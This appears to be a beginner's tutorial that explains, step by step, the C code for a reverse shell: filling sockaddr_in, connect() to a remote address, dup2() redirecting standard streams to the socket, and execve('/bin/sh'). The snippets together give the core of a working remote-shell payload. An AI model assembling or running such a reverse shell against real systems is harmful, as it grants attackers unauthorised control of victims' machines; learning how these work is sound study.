# Reverse Shell in C using socket()  

#### lil disclaimer

I'm new to C programming, and I've decided to share my learning progressing.  
Please be forgiving if there are mistakes, feel free to correct me to help me gain new knowledge.
(obviously for purprose only)  

#
`socket()` is a syscall dependent on the `<sys/socket.h>` library. To understand its functioning, we need to understand the struct components that compose it.

## struct sockaddr_in  

```c
struct sockaddr_in server_addr;
```  

Defining the variable `server_addr` of type `struct sockaddr_in` serves to represent the server's address. Memory space is created to store this structure. Its fields can then be filled with specific address information for the server:

```c
struct sockaddr_in {
   uint8_t         sin_len;       // longueur totale      
   sa_family_t     sin_family;    // famille : AF_INET    
   in_port_t       sin_port;      // le numéro de port  
   struct in_addr  sin_addr;      // l'adresse internet  
   unsigned char   sin_zero[8];   // un champ de 8 zéros  
```  

Here are all the variables defined within the struct `sockaddr_in`.  
We only use `sin_family`, `sin_port`, and `sin_addr`.  
The `sin_family` variable is set to `AF_INET` as a parameter to designate the type of address the socket will communicate with, which in this case is `IPv4`.  
The `sin_port` variable takes the port as a parameter, which is itself passed to the `htons()` function (host to network short). `htons()` converts an unsigned short integer from host byte order to network byte order (big-endian).  
Therefore, by using `AF_INET` for the `sin_family`, `sin_port` for the port, and `htons()` for converting the port to network byte order, we are configuring the server address to be an `IPv4` address with the specified port.

## inet_pton()  

```c
inet_pton(AF_INET, IP, &(server_addr.sin_addr));
```  

`inet_pton()` is used to convert an `IPv4` or `IPv6` address (in basic string format) into a binary representation used by sockets. It takes the `AF` (Address Family) as a parameter, converts the `IP` address (currently in string format), and stores it in the `sin_addr` variable of the `server_addr` struct.  

## connect()  

```c
connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
```  

`connect()` establishes a connection between the client socket (`sockfd`) and the server socket (`server_addr`).  
`(struct sockaddr *)&server_addr` converts the pointer `server_addr` into a pointer of type `struct sockaddr *`.  
We learn from the function prototype in its man page that `connect()` expects the second argument to be a pointer to `struct sockaddr`.  
`sizeof(server_addr)` specifies the size of the `server_addr` struct in bytes, allowing `connect()` to know the size of the structure to perform the connection.  

## dup2()  

```c
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
```

`dup2()` duplicates an existing file descriptor to another file descriptor. It takes the parent file descriptor and the child file descriptor as arguments.  
`stdin` (0), `stdout` (1), and std`err (2) are redirected to the file descriptor of `sockfd`.  
In essence, any input retrieved from `stdin` will be read from the `socket`, and any output written to `stdout` and `stderr` will be sent to the server via the network connection.  

## execve()

```c
execve("/bin/sh", 0, 0);
```  

`execve()` is a syscall that allows executing a new program from a specified executable file (in this case, `/bin/sh`).  
From its man page, we learn that `execve()` takes the second argument as a char pointer to an array of arguments and the third argument as a char pointer to the environment in which the program is launched.  
Since those parameters are not used in our code snippet, they are defined as `0`.  
In this context, it executes the `/bin/sh` program, launching a shell process in the current execution environment.

## close()


```c
close(sockfd);
```
`close()` is used to close a file descriptor. Here, `close()` is called to release the allocated resources and terminate the network connection.    

## Resources
https://broux.developpez.com/articles/c/sockets/ (a complete french documentation)  
https://man.archlinux.org/man/  
https://man7.org/linux/man-pages/  
Special mention to @h0mbre ˚ʚ♡ɞ˚
